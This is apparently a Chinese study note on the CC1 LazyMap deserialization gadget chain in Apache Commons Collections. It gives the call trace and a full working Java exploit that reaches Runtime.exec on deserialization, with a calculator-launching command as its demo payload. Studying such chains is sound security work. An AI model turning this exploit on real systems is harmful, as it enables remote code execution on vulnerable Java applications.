---
title: CC1(LazyMap)
date: 2026-02-02 20:13:48
updated: 2026-02-09 19:45:30
tags:
  - Web
  - java
  - 反序列化
  - CC链
---
| **Gadget Chain** | **CC 版本依赖** | **JDK 版本限制** | **核心入口点 (Source)** | **核心特征/用途** |
| --- | --- | --- | --- | --- |
| **CC1** | 3.1 - 3.2.1 | **JDK < 8u71** | `AnnotationInvocationHandler` | 鼻祖链，利用动态代理。高版本 JDK 修复了入口点。 |

```java
/*
    Gadget chain:
       ObjectInputStream.readObject()
          AnnotationInvocationHandler.readObject()
             Map(Proxy).entrySet()
                AnnotationInvocationHandler.invoke()
                   LazyMap.get()
                      ChainedTransformer.transform()
                         ConstantTransformer.transform()
                         InvokerTransformer.transform()
                            Method.invoke()
                               Class.getDeclaredMethod()
                         InvokerTransformer.transform()
                            Method.invoke()
                               Runtime.getRuntime()
                         InvokerTransformer.transform()
                            Method.invoke()
                               Runtime.exec()

 */
```

![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1770138370803-eb0320fd-46c3-49a5-b5f6-aa9a827731aa.png)

# EXP

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class CC1_LazyMap {
    public static void main(String[] args) throws Exception {

        //Class<Runtime> r = Runtime.class;
        //Runtime ro = Runtime.getRuntime();
        //Method getRuntime = r.getDeclaredMethod("getRuntime");
        //Object obj = getRuntime.invoke(null, null);
        //Method exec = r.getDeclaredMethod("exec", String.class);
        //exec.invoke(obj,"open -a Calculator");

        HashMap<Object, Object> map = new HashMap<>();
        map.put("key", "value");
        //InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"});

        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"})};
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //chain.transform("");
        Map lazymap = LazyMap.decorate(map, chainedTransformer);
        //lazymap.get(ro);

        Class annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor declaredConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Target.class, lazymap);
        Map proxymap = (Map) Proxy.newProxyInstance(lazymap.getClass().getClassLoader(), new Class[]{Map.class}, handler);
        /*proxymap.get(ro);报错，AnnotationInvocationHandler 是专门为注解（Annotation）设计的。 在 Java 中，注解接口定义的方法（比如 @Target(value=...) 中的 value()）全都是无参方法。 因此，这个 Handler 只要发现你调用的方法有参数（除了 equals），它就认为这绝对不是一个合法的注解方法调用，直接抛出 AssertionError。*/
        //proxymap.entrySet();
        //将AnnotationInvocationHandler用Proxy进行代理，在readObject的时候，只要调用任意方法，就会进入到AnnotationInvocationHandler#invoke方法中，进而触发LazyMap#get
        Object proxyhandler = declaredConstructor.newInstance(Target.class, proxymap);

        serialize(proxyhandler);
        unserialize("bin.ser");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("bin.ser"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        return ois.readObject();
    }
}
```

![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1770137328475-8bcdd114-be04-4d87-9cdf-39fb6f7762d2.png)

# JDK动态代理

[链接](https://player.bilibili.com/player.html?bvid=BV16h411z7o9&p=3&page=3&autoplay=0)